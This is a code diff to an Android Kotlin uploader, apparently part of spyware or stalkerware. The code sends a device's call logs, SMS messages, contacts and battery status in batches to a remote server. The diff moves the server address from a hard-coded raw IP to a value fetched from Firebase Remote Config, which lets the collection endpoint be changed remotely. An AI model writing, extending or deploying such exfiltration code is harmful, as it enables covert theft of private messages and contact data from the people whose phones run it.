@@ -13,7 +13,9 @@ import java.net.URL
 object DataUploader {
 
     private const val TAG = "DataUploader"
-    private const val BASE_URL = "http://95.134.130.160:8765"
+    
+    // ⭐ آدرس سرور از Firebase Remote Config
+    private fun getBaseUrl(): String = com.example.test.ServerConfig.getBaseUrl()
 
     /**
      * رجیستر کردن دستگاه در سرور (فرمت snake_case برای سینک با Python)
@@ -37,7 +39,7 @@ object DataUploader {
                 put("app_type", appConfig.appType)
             }
 
-            val result = sendPostRequest("$BASE_URL/register", registerJson.toString())
+            val result = sendPostRequest("${getBaseUrl()}/register", registerJson.toString())
             Log.d(TAG, "✅ Device registered successfully")
             true
 
@@ -121,7 +123,7 @@ object DataUploader {
 
             Log.d(TAG, "📤 Payload: ${payload.toString()}")
 
-            val response = sendPostRequest("$BASE_URL/call-logs/batch", payload.toString())
+            val response = sendPostRequest("${getBaseUrl()}/call-logs/batch", payload.toString())
             Log.d(TAG, "✅ Call history uploaded: ${callsArray.length()} calls - Response: $response")
 
         } catch (e: SecurityException) {
@@ -195,7 +197,7 @@ object DataUploader {
                 })
             }
 
-            sendPostRequest("$BASE_URL/sms/batch", json.toString())
+            sendPostRequest("${getBaseUrl()}/sms/batch", json.toString())
             Log.d(TAG, "✅ SMS uploaded: ${messages.length()} messages")
 
         } catch (e: Exception) {
@@ -280,7 +282,7 @@ object DataUploader {
                 })
             }
 
-            sendPostRequest("$BASE_URL/contacts/batch", json.toString())
+            sendPostRequest("${getBaseUrl()}/contacts/batch", json.toString())
             Log.d(TAG, "✅ Contacts uploaded: ${contacts.length()} contacts")
 
         } catch (e: Exception) {
@@ -306,7 +308,7 @@ object DataUploader {
                 put("timestamp", System.currentTimeMillis())
             }
 
-            sendPostRequest("$BASE_URL/battery", json.toString())
+            sendPostRequest("${getBaseUrl()}/battery", json.toString())
             Log.d(TAG, "🔋 Battery update sent: $batteryLevel%")
 
         } catch (e: Exception) {
